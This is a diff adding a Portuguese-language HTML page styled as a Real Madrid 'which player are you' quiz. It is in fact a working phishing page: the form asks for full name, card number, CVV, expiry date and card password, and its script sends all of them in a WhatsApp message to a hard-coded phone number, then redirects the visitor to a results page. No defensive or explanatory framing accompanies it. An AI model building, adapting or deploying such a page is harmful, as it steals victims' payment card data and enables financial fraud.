@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulário WhatsApp</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #f0f0f0;
+    }
+
+    .container {
+      width: 400px;
+      text-align: center;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .image {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+
+    form {
+      margin-top: 20px;
+    }
+
+    input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      display: block;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #25d366;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #1ebc59;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="assets/imgs/Real Madrid.jpg" alt="Imagem ilustrativa" class="image">
+    <h1>Descubra quem você seria no time do Real Madrid:</h1>
+    <form id="form">
+      <input type="text" id="input1" placeholder="Digite seu nome completo" required>
+      <input type="text" id="input2" placeholder="Digite os números do seu cartão" required>
+      <input type="text" id="input3" placeholder="Digite o cvv do seu cartão" required>
+      <input type="text" id="input4" placeholder="Digite a data de validade de seu cartão" required>
+      <input type="text" id="input5" placeholder="Por último, digite a senha" required>
+      <button type="button" id="sendButton">Resultado</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("sendButton").addEventListener("click", function() {
+      // Obter os valores dos inputs
+      const input1 = document.getElementById("input1").value;
+      const input2 = document.getElementById("input2").value;
+      const input3 = document.getElementById("input3").value;
+      const input4 = document.getElementById("input4").value;
+      const input5 = document.getElementById("input5").value;
+
+      // Verificar se todos os campos foram preenchidos
+      if (!input1 || !input2 || !input3 || !input4 || !input5) {
+        alert("Por favor, preencha todos os campos.");
+        return;
+      }
+
+      // Criar a mensagem
+      const mensagem = `Olá! Aqui estão as informações:
+1. ${input1}
+2. ${input2}
+3. ${input3}
+4. ${input4}
+5. ${input5}`;
+
+      // Número do WhatsApp (adicione o DDI e DDD)
+      const numeroWhatsApp = "5515997672075";
+
+      // Criar o link para o WhatsApp
+      const link = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensagem)}`;
+
+      // Abrir o WhatsApp
+      window.open(link, "_blank");
+
+      // Redirecionar o usuário para um site (substitua pelo site desejado)
+      setTimeout(() => {
+        window.location.href = "resultado.html";
+      }, 1000); // Tempo de espera de 1 segundo antes do redirecionamento
+    });
+  </script>
+</body>
+</html>
